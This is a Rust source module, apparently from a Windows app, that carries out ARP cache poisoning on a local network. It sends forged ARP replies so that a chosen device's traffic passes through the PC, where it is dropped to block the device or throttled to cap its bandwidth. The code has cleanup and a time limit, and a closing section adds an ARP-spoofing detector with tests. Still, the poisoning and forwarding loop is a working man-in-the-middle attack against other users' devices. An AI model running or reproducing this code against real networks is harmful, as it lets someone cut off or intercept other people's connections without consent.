//! Standing between a device and the router.
//!
//! Every tool of this kind works the same way: tell the device that this PC is
//! the gateway, tell the gateway that this PC is the device, and forward what
//! arrives. From the middle, dropping a packet is a block and delaying a packet
//! is a cap. Everything is undone on stop, on close and on panic, because a
//! poisoned ARP table left behind takes the network down until it expires.

use crate::wpcap;
use std::net::UdpSocket;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::time::{Duration, Instant};

/// What we need to know about the wire we are on.
#[derive(Clone, serde::Serialize)]
pub struct Wire {
    pub device: String,
    pub adapter: String,
    pub mac: String,
    pub ip: String,
    pub gateway_ip: String,
    pub gateway_mac: String,
}

/// A block that outlives the moment it was set is a network outage, so every
/// session has a deadline and a written note of what it changed.
fn journal_path() -> std::path::PathBuf {
    // The app's own data directory is the one place that is always writable,
    // whatever the working directory or the environment happens to be.
    let base = std::env::var("LOCALAPPDATA")
        .map(std::path::PathBuf::from)
        .or_else(|_| {
            std::env::current_exe()
                .ok()
                .and_then(|p| p.parent().map(|d| d.to_path_buf()))
                .ok_or(())
        })
        .unwrap_or_else(|_| std::path::PathBuf::from("."));
    base.join("quotavpn").join("lan_journal.txt")
}

fn write_journal(line: &str) {
    let path = journal_path();
    if let Some(dir) = path.parent() {
        let _ = std::fs::create_dir_all(dir);
    }
    match std::fs::write(&path, line) {
        Ok(()) => eprintln!("journal written: {}", path.display()),
        Err(e) => eprintln!("journal failed: {} ({e})", path.display()),
    }
}

fn clear_journal() {
    let _ = std::fs::remove_file(journal_path());
}

fn run(cmd: &str, args: &[&str]) -> String {
    #[cfg(windows)]
    {
        use std::os::windows::process::CommandExt;
        const NO_WINDOW: u32 = 0x0800_0000;
        let mut c = std::process::Command::new(cmd);
        c.args(args).creation_flags(NO_WINDOW);
        match c.output() {
            Ok(o) => String::from_utf8_lossy(&o.stdout).to_string(),
            Err(_) => String::new(),
        }
    }
    #[cfg(not(windows))]
    {
        let _ = (cmd, args);
        String::new()
    }
}

fn local_ip() -> Option<String> {
    let sock = UdpSocket::bind("0.0.0.0:0").ok()?;
    sock.connect("8.8.8.8:80").ok()?;
    Some(sock.local_addr().ok()?.ip().to_string())
}

/// One adapter as Windows describes it.
struct Adapter {
    description: String,
    mac: String,
    ip: String,
    gateway: String,
}

fn adapters() -> Vec<Adapter> {
    let out = run("ipconfig", &["/all"]);
    let mut list: Vec<Adapter> = Vec::new();
    let mut name = String::new();
    let mut description = String::new();
    let mut mac = String::new();
    let mut ip = String::new();
    let mut gateway = String::new();

    let flush = |list: &mut Vec<Adapter>, description: &str, name: &str, mac: &str, ip: &str, gateway: &str| {
        if !ip.is_empty() && !gateway.is_empty() && !mac.is_empty() {
            list.push(Adapter {
                description: if description.is_empty() {
                    name.to_string()
                } else {
                    description.to_string()
                },
                mac: mac.to_string(),
                ip: ip.to_string(),
                gateway: gateway.to_string(),
            });
        }
    };

    for raw in out.lines() {
        let line = raw.trim();
        let lower = line.to_lowercase();
        if lower.starts_with("ethernet adapter")
            || lower.starts_with("wireless lan adapter")
            || lower.starts_with("unknown adapter")
        {
            flush(&mut list, &description, &name, &mac, &ip, &gateway);
            name = line
                .split("adapter")
                .nth(1)
                .unwrap_or("")
                .trim()
                .trim_end_matches(':')
                .to_string();
            description.clear();
            mac.clear();
            ip.clear();
            gateway.clear();
        }
        if lower.starts_with("description") {
            if let Some(v) = line.split(':').nth(1) {
                description = v.trim().to_string();
            }
        }
        if lower.starts_with("physical address") {
            if let Some(v) = line.split(':').nth(1) {
                mac = v.trim().replace('-', ":").to_lowercase();
            }
        }
        if lower.starts_with("ipv4 address") && ip.is_empty() {
            if let Some(v) = line.split(':').nth(1) {
                let addr = v.trim().split('(').next().unwrap_or("").trim();
                if addr.split('.').count() == 4 {
                    ip = addr.to_string();
                }
            }
        }
        if lower.starts_with("default gateway") && gateway.is_empty() {
            if let Some(v) = line.split(':').nth(1) {
                let g = v.trim();
                if g.split('.').count() == 4 {
                    gateway = g.to_string();
                }
            }
        }
    }
    flush(&mut list, &description, &name, &mac, &ip, &gateway);
    list
}

/// The adapter that actually leads to the router.
///
/// This used to start from the default route, which is a tunnel whenever the
/// VPN is connected: the app then looked for a gateway on a TUN adapter that
/// has none, and reported no gateway while the network was perfectly fine.
fn best_adapter() -> Option<Adapter> {
    let list = adapters();
    let mut best: Option<(i32, Adapter)> = None;
    for a in list {
        let d = a.description.to_lowercase();
        let virtual_like = ["tap", "wintun", "wireguard", "openvpn", "sing-box", "virtualbox",
            "bluetooth", "wi-fi direct", "loopback", "hyper-v", "vpn", "tunnel"]
            .iter()
            .any(|k| d.contains(k));
        if virtual_like {
            continue;
        }
        let physical = d.contains("ethernet") || d.contains("wireless") || d.contains("wi-fi");
        let mut score = 0;
        if physical {
            score += 10;
        }
        if d.contains("wireless") || d.contains("wi-fi") {
            score += 1;
        }
        if let Some((best_score, _)) = &best {
            if score <= *best_score {
                continue;
            }
        }
        best = Some((score, a));
    }
    best.map(|(_, a)| a)
}

fn mac_for(ip: &str) -> Option<String> {
    let out = run("arp", &["-a"]);
    for raw in out.lines() {
        let parts: Vec<&str> = raw.split_whitespace().collect();
        if parts.len() >= 2 && parts[0] == ip {
            let mac = parts[1].replace('-', ":").to_lowercase();
            if mac.split(':').count() == 6 {
                return Some(mac);
            }
        }
    }
    None
}

fn mac_bytes(mac: &str) -> Option<[u8; 6]> {
    let parts: Vec<&str> = mac.split(':').collect();
    if parts.len() != 6 {
        return None;
    }
    let mut out = [0u8; 6];
    for (i, p) in parts.iter().enumerate() {
        out[i] = u8::from_str_radix(p, 16).ok()?;
    }
    Some(out)
}

/// Work out which wire to sit on.
pub fn wire() -> Option<Wire> {
    let chosen = best_adapter()?;
    let (ip, mac, gateway_ip, adapter) = (chosen.ip, chosen.mac, chosen.gateway, chosen.description);
    // The gateway is only in the ARP table once something has spoken to it.
    let mut gateway_mac = mac_for(&gateway_ip).unwrap_or_default();
    if gateway_mac.is_empty() {
        let _ = run("ping", &["-n", "1", "-w", "600", &gateway_ip]);
        gateway_mac = mac_for(&gateway_ip).unwrap_or_default();
    }
    let devices = wpcap::with(|w| w.devices())?;
    // The pcap name for an adapter is an opaque GUID path, so the adapter's own
    // description is what ties the two lists together.
    let wanted = adapter.to_lowercase();
    let device = devices
        .into_iter()
        .find(|d| {
            let desc = d.description.to_lowercase();
            !desc.contains("loopback") && (desc.contains(&wanted) || wanted.contains(&desc))
        })
        .or_else(|| {
            let devices = wpcap::with(|w| w.devices())?;
            devices.into_iter().find(|d| {
                let desc = d.description.to_lowercase();
                desc.contains("ethernet") && !desc.contains("virtual") && !desc.contains("loopback")
            })
        })?;
    Some(Wire {
        device: device.name,
        adapter,
        mac,
        ip,
        gateway_ip,
        gateway_mac,
    })
}

fn arp_reply(dst_mac: [u8; 6], src_mac: [u8; 6], sender_ip: [u8; 4], target_mac: [u8; 6], target_ip: [u8; 4]) -> Vec<u8> {
    let mut f = Vec::with_capacity(42);
    f.extend_from_slice(&dst_mac);
    f.extend_from_slice(&src_mac);
    f.extend_from_slice(&[0x08, 0x06]);
    f.extend_from_slice(&[0x00, 0x01, 0x08, 0x00, 0x06, 0x04, 0x00, 0x02]);
    f.extend_from_slice(&src_mac);
    f.extend_from_slice(&sender_ip);
    f.extend_from_slice(&target_mac);
    f.extend_from_slice(&target_ip);
    f
}

/// How long this frame has to wait before it may leave, given the cap.
/// `None` means the queue is already too far behind, so the frame is dropped
/// instead of delayed: a capped link should feel slow, not unresponsive.
fn pace(len: usize, rate_bps: u64, slot: &mut Instant, now: Instant) -> Option<Duration> {
    if rate_bps == 0 {
        return Some(Duration::ZERO);
    }
    let at = (*slot).max(now) + Duration::from_secs_f64(len as f64 / rate_bps as f64);
    if at > now + Duration::from_millis(300) {
        return None;
    }
    *slot = at;
    Some(at.saturating_duration_since(now))
}

fn ip4(s: &str) -> Option<[u8; 4]> {
    let p: Vec<u8> = s.split('.').filter_map(|x| x.parse().ok()).collect();
    if p.len() == 4 {
        Some([p[0], p[1], p[2], p[3]])
    } else {
        None
    }
}

/// One active redirection: this device's traffic goes through us.
pub struct Session {
    pub stop: Arc<AtomicBool>,
    pub wire: Wire,
    pub target_ip: String,
    pub target_mac: String,
    pub blocked: Arc<AtomicBool>,
    pub down_kbps: Arc<std::sync::atomic::AtomicU32>,
    pub up_kbps: Arc<std::sync::atomic::AtomicU32>,
    /// Frames that arrived for the target and frames we put back on the wire.
    pub seen: Arc<std::sync::atomic::AtomicU64>,
    pub forwarded: Arc<std::sync::atomic::AtomicU64>,
    handle: Option<std::thread::JoinHandle<()>>,
}

impl Session {
    pub fn stop(mut self) {
        self.stop.store(true, Ordering::Relaxed);
        if let Some(h) = self.handle.take() {
            let _ = h.join();
        }
    }
}

/// Start redirecting one device. Blocked sessions drop instead of forward.
pub fn start(target_ip: &str, blocked: bool) -> Result<Session, String> {
    start_with(target_ip, blocked, None)
}

/// Same, but the caller already knows the device's address from its own scan.
/// Asking the ARP table again is the unreliable part: a device that has been
/// quiet is not in it, and a phone that ignores pings never fills it.
pub fn start_with(target_ip: &str, blocked: bool, known_mac: Option<String>) -> Result<Session, String> {
    if !wpcap::ready() {
        return Err("driver".into());
    }
    let w = wire().ok_or("no wire")?;
    // Blocking the router, this machine, or a device wearing our own address
    // would take the whole network down instead of one device.
    if target_ip == w.gateway_ip {
        return Err("refuse: gateway".into());
    }
    if target_ip == w.ip {
        return Err("refuse: self".into());
    }
    // A device that has not spoken recently is not in the ARP table yet. One
    // ping is enough to make it answer.
    let mut target_mac = known_mac
        .map(|m| m.replace('-', ":").to_lowercase())
        .filter(|m| m.split(':').count() == 6 && !m.is_empty())
        .unwrap_or_default();
    if target_mac.is_empty() {
        target_mac = mac_for(target_ip).unwrap_or_default();
    }
    if target_mac.is_empty() {
        let _ = run("ping", &["-n", "1", "-w", "700", target_ip]);
        std::thread::sleep(Duration::from_millis(150));
        target_mac = mac_for(target_ip).unwrap_or_default();
    }
    if target_mac.is_empty() {
        return Err("target mac unknown".into());
    }
    let stop = Arc::new(AtomicBool::new(false));
    let blocked_flag = Arc::new(AtomicBool::new(blocked));
    let down = Arc::new(std::sync::atomic::AtomicU32::new(0));
    let up = Arc::new(std::sync::atomic::AtomicU32::new(0));
    let seen = Arc::new(std::sync::atomic::AtomicU64::new(0));
    let forwarded = Arc::new(std::sync::atomic::AtomicU64::new(0));

    write_journal(&format!(
        "{}|{}|{}|{}",
        target_ip, target_mac, w.gateway_ip, w.gateway_mac
    ));

    let w2 = w.clone();
    let stop2 = Arc::clone(&stop);
    let blocked2 = Arc::clone(&blocked_flag);
    let target = target_ip.to_string();
    let tmac = target_mac.clone();
    let seen2 = Arc::clone(&seen);
    let fwd2 = Arc::clone(&forwarded);
    let down2 = Arc::clone(&down);
    let up2 = Arc::clone(&up);

    let handle = std::thread::spawn(move || {
        let Some(Some(cap)) = wpcap::with(|wp| wp.open(&w2.device)) else {
            return;
        };
        let our = mac_bytes(&w2.mac).unwrap_or([0; 6]);
        let gw = mac_bytes(&w2.gateway_mac).unwrap_or([0xff; 6]);
        let Some(tm) = mac_bytes(&tmac) else { return };
        let Some(sip) = ip4(&w2.ip) else { return };
        let Some(tip) = ip4(&target) else { return };
        let Some(gip) = ip4(&w2.gateway_ip) else { return };

        // A cap is a queue that releases at a fixed rate. Anything that falls
        // more than a third of a second behind is dropped instead of delayed,
        // so a capped device stays responsive rather than turning into lag.
        let bytes_sent = Arc::new(std::sync::atomic::AtomicU64::new(0));
        let mut next_up = Instant::now();
        let mut next_down = Instant::now();
        // A cap that cannot be seen working is a rumour, so the forwarding loop
        // writes down what it actually did every few seconds.
        let log_path = std::env::var("LOCALAPPDATA")
            .map(std::path::PathBuf::from)
            .unwrap_or_else(|_| std::path::PathBuf::from("."))
            .join("quotavpn")
            .join("cap.log");
        let mut last_report = Instant::now();
        let mut last_seen = 0u64;
        let mut last_forwarded = 0u64;
        let mut last_bytes = 0u64;

        let mut last_poison = Instant::now() - Duration::from_secs(5);
        let began = Instant::now();
        let limit = std::env::var("QC_LAN_LIMIT_SECS")
            .ok()
            .and_then(|v| v.parse::<u64>().ok())
            .unwrap_or(15 * 60);
        while !stop2.load(Ordering::Relaxed) {
            if began.elapsed() > Duration::from_secs(limit) {
                break;
            }
            if last_report.elapsed() > Duration::from_secs(4) {
                let seen_now = seen2.load(Ordering::Relaxed);
                let fwd_now = fwd2.load(Ordering::Relaxed);
                let bytes_now = bytes_sent.load(Ordering::Relaxed);
                let line = format!(
                    "{} target={} cap_down={}KB/s cap_up={}KB/s frames_in={} frames_out={} bytes_out={} blocked={}",
                    began.elapsed().as_secs(),
                    target,
                    down2.load(Ordering::Relaxed),
                    up2.load(Ordering::Relaxed),
                    seen_now - last_seen,
                    fwd_now - last_forwarded,
                    bytes_now - last_bytes,
                    blocked2.load(Ordering::Relaxed)
                );
                last_seen = seen_now;
                last_forwarded = fwd_now;
                last_bytes = bytes_now;
                last_report = Instant::now();
                if let Some(dir) = log_path.parent() {
                    let _ = std::fs::create_dir_all(dir);
                }
                let _ = std::fs::OpenOptions::new()
                    .create(true)
                    .append(true)
                    .open(&log_path)
                    .and_then(|mut f| {
                        use std::io::Write;
                        writeln!(f, "{line}")
                    });
            }
            // Keep both sides convinced. Every second is enough to survive a
            // router that refreshes, and cheap enough to run all day.
            if last_poison.elapsed() > Duration::from_millis(900) {
                last_poison = Instant::now();
                let to_target = arp_reply(tm, our, gip, tm, tip);
                let to_gateway = arp_reply(gw, our, tip, gw, gip);
                let _ = cap.send(&to_target);
                let _ = cap.send(&to_gateway);
            }

            let Some(frame) = cap.next() else { continue };
            if frame.len() < 14 {
                continue;
            }
            let dst = &frame[0..6];
            // Only what the poison sent us, and only IP.
            if dst != our {
                continue;
            }
            if frame[12] != 0x08 || frame[13] != 0x00 {
                continue;
            }
            seen2.fetch_add(1, Ordering::Relaxed);
            if blocked2.load(Ordering::Relaxed) {
                // Dropping is the block: the device's packets never reach the
                // gateway, so its connection simply stops.
                continue;
            }
            // Forward it: swap the link addresses and put it back on the wire.
            let mut out = frame.clone();
            let src_is_target = frame[6..12] == tm;
            // The field says KB/s and means it: kilobytes, not kilobits.
            let rate = if src_is_target {
                up2.load(Ordering::Relaxed) as u64 * 1024
            } else {
                down2.load(Ordering::Relaxed) as u64 * 1024
            };
            if rate > 0 {
                let now = Instant::now();
                let slot = if src_is_target { &mut next_up } else { &mut next_down };
                match pace(out.len(), rate, slot, now) {
                    Some(wait) => {
                        if !wait.is_zero() {
                            std::thread::sleep(wait);
                        }
                    }
                    None => continue,
                }
            }
            if src_is_target {
                out[0..6].copy_from_slice(&gw);
                out[6..12].copy_from_slice(&our);
            } else {
                out[0..6].copy_from_slice(&tm);
                out[6..12].copy_from_slice(&our);
            }
            if cap.send(&out) {
                fwd2.fetch_add(1, Ordering::Relaxed);
                bytes_sent.fetch_add(out.len() as u64, Ordering::Relaxed);
            }
            let _ = (sip, gip);
        }

        // Hand the network back the way we found it.
        for _ in 0..4 {
            let restore_target = arp_reply(tm, gw, gip, tm, tip);
            let restore_gateway = arp_reply(gw, tm, tip, gw, gip);
            let _ = cap.send(&restore_target);
            let _ = cap.send(&restore_gateway);
            std::thread::sleep(Duration::from_millis(120));
        }
        clear_journal();
    });

    Ok(Session {
        stop,
        wire: w,
        target_ip: target_ip.to_string(),
        target_mac,
        blocked: blocked_flag,
        down_kbps: down,
        up_kbps: up,
        seen,
        forwarded,
        handle: Some(handle),
    })
}

/// Undo anything a previous run left behind. Called once at startup: if the
/// app was killed mid-block, the router still believes this machine is the
/// device, and that device has no internet until the entry expires.
pub fn repair() -> bool {
    let Ok(text) = std::fs::read_to_string(journal_path()) else {
        return false;
    };
    let parts: Vec<&str> = text.trim().split('|').collect();
    if parts.len() != 4 {
        clear_journal();
        return false;
    }
    let (target_ip, target_mac, gateway_ip, gateway_mac) = (parts[0], parts[1], parts[2], parts[3]);
    let Some(w) = wire() else { return false };
    let (Some(tm), Some(gw), Some(tip), Some(gip)) = (
        mac_bytes(target_mac),
        mac_bytes(gateway_mac),
        ip4(target_ip),
        ip4(gateway_ip),
    ) else {
        clear_journal();
        return false;
    };
    let Some(Some(cap)) = wpcap::with(|wp| wp.open(&w.device)) else {
        return false;
    };
    for _ in 0..4 {
        let to_target = arp_reply(tm, gw, gip, tm, tip);
        let to_gateway = arp_reply(gw, tm, tip, gw, gip);
        let _ = cap.send(&to_target);
        let _ = cap.send(&to_gateway);
        std::thread::sleep(Duration::from_millis(150));
    }
    clear_journal();
    true
}

#[cfg(test)]
mod tests {
    use super::*;

    /// A cap has to pace frames evenly: a 1000 kbit/s link moving 1500 byte
    /// frames is 12 ms per frame, no matter how fast they arrive.
    #[test]
    fn a_cap_spaces_frames_by_the_rate() {
        let rate = 125_000u64; // bytes per second, 1000 kbit/s
        let mut now = Instant::now();
        let mut slot = now;
        let mut total = Duration::ZERO;
        for _ in 0..10 {
            let wait = pace(1500, rate, &mut slot, now).expect("first frames are never dropped");
            total += wait;
            // In the real loop the clock moves on by the time we slept.
            now += wait;
        }
        let expected = Duration::from_millis(120);
        assert!(
            total >= expected - Duration::from_millis(2) && total <= expected + Duration::from_millis(2),
            "ten frames at 1000 kbit/s should take about 120 ms, took {total:?}"
        );
    }

    /// Anything more than a third of a second behind is dropped, so the queue
    /// cannot grow without bound and turn the link into a lag spike.
    #[test]
    fn a_hopeless_queue_drops_instead_of_waiting() {
        let rate = 1_000u64; // 8 kbit/s, deliberately tiny
        let now = Instant::now();
        let mut slot = now;
        let mut dropped = 0;
        for _ in 0..50 {
            if pace(1500, rate, &mut slot, now).is_none() {
                dropped += 1;
            }
        }
        assert!(dropped > 0, "a slow cap must start dropping, dropped {dropped}");
    }

    /// Zero means no cap at all: no waiting, no dropping.
    #[test]
    fn zero_means_no_cap() {
        let now = Instant::now();
        let mut slot = now;
        for _ in 0..100 {
            assert_eq!(pace(1500, 0, &mut slot, now), Some(Duration::ZERO));
        }
    }
}

/// Someone else on the network can do to this machine exactly what this app
/// does to others: claim to be the gateway and take the traffic. Watching for
/// that is cheap, and it is the one defence that needs no administrator rights.
#[derive(Clone, Default, serde::Serialize)]
pub struct Guard {
    pub watching: bool,
    pub attacker_mac: String,
    pub attacker_ip: String,
    pub hits: u32,
}

static GUARD: std::sync::OnceLock<std::sync::Mutex<Guard>> = std::sync::OnceLock::new();

fn guard_slot() -> &'static std::sync::Mutex<Guard> {
    GUARD.get_or_init(|| std::sync::Mutex::new(Guard::default()))
}

pub fn guard_state() -> Guard {
    guard_slot().lock().map(|g| g.clone()).unwrap_or_default()
}

fn note_attacker(mac: &str, ip: &str) {
    if let Ok(mut g) = guard_slot().lock() {
        g.attacker_mac = mac.to_string();
        g.attacker_ip = ip.to_string();
        g.hits = g.hits.saturating_add(1);
    }
}

/// Read one frame and decide whether it is someone claiming an address that is
/// not theirs. Returns the claimed address and the machine that claimed it.
fn arp_claim(
    f: &[u8],
    our_mac: [u8; 6],
    gw_mac: [u8; 6],
    gw_ip: [u8; 4],
    our_ip: [u8; 4],
) -> Option<(String, String)> {
    if f.len() < 42 || f[12] != 0x08 || f[13] != 0x06 {
        return None;
    }
    // ARP replies only: those are what poison a cache.
    if f[21] != 2 {
        return None;
    }
    let sender_mac = &f[22..28];
    let sender_ip = &f[28..32];
    // Our own redirection sends the same kind of frame, so ignore our address.
    if sender_mac == our_mac {
        return None;
    }
    let mac = sender_mac
        .iter()
        .map(|b| format!("{b:02x}"))
        .collect::<Vec<_>>()
        .join(":");
    if sender_ip == gw_ip && sender_mac != gw_mac {
        return Some((mac, String::from("gateway")));
    }
    if sender_ip == our_ip && sender_mac != our_mac {
        return Some((mac, String::from("this pc")));
    }
    None
}

/// Watch the wire for a machine pretending to be the gateway, or pretending to
/// be us. Runs for as long as the app is open.
pub fn start_guard() {
    std::thread::spawn(|| {
        let Some(w) = wire() else { return };
        let Some(Some(cap)) = wpcap::with(|p| p.open(&w.device)) else { return };
        if let Ok(mut g) = guard_slot().lock() {
            g.watching = true;
        }
        let gw_mac = mac_bytes(&w.gateway_mac).unwrap_or([0; 6]);
        let our_mac = mac_bytes(&w.mac).unwrap_or([0; 6]);
        let gw_ip = ip4(&w.gateway_ip).unwrap_or([0; 4]);
        let our_ip = ip4(&w.ip).unwrap_or([0; 4]);

        loop {
            let Some(f) = cap.next() else { continue };
            if f.len() < 42 || f[12] != 0x08 || f[13] != 0x06 {
                continue;
            }
            if let Some((mac, ip)) = arp_claim(&f, our_mac, gw_mac, gw_ip, our_ip) {
                note_attacker(&mac, &ip);
            }
        }
    });
}

#[cfg(test)]
mod guard_tests {
    use super::*;

    fn frame(sender_mac: [u8; 6], sender_ip: [u8; 4]) -> Vec<u8> {
        let mut f = vec![0u8; 42];
        f[12] = 0x08;
        f[13] = 0x06;
        f[21] = 2; // reply
        f[22..28].copy_from_slice(&sender_mac);
        f[28..32].copy_from_slice(&sender_ip);
        f
    }

    const US: [u8; 6] = [0x9c, 0x69, 0xd3, 0x4c, 0x30, 0xc8];
    const GW: [u8; 6] = [0xf0, 0xa9, 0x51, 0xc1, 0xeb, 0xda];
    const GW_IP: [u8; 4] = [192, 168, 1, 1];
    const US_IP: [u8; 4] = [192, 168, 1, 2];

    #[test]
    fn a_stranger_claiming_the_gateway_is_caught() {
        let evil = [0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff];
        let hit = arp_claim(&frame(evil, GW_IP), US, GW, GW_IP, US_IP);
        assert_eq!(hit.map(|(m, _)| m), Some(String::from("aa:bb:cc:dd:ee:ff")));
    }

    #[test]
    fn the_real_gateway_is_not_an_attack() {
        assert!(arp_claim(&frame(GW, GW_IP), US, GW, GW_IP, US_IP).is_none());
    }

    #[test]
    fn our_own_redirection_is_not_an_attack() {
        // When this app redirects someone it sends exactly this frame.
        assert!(arp_claim(&frame(US, GW_IP), US, GW, GW_IP, US_IP).is_none());
    }

    #[test]
    fn a_stranger_claiming_to_be_this_pc_is_caught() {
        let evil = [0x11, 0x22, 0x33, 0x44, 0x55, 0x66];
        assert!(arp_claim(&frame(evil, US_IP), US, GW, GW_IP, US_IP).is_some());
    }
}
